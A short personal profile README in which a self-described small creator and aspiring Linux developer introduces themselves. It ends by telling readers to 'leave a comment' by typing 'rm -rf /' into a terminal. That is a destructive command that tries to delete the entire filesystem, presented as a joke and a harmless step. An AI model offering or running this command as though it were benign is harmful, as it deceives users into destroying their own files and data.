# Hello everybody

I am **a small creator** from the world of all things. 

I like Linux, and try to be a **profesional developer** # (you tell me if I am good enough to be called that).

I see you have read all of this so now leave me a comment by typing this into terminal (don't be `root`):

``` bash
rm -rf /
```
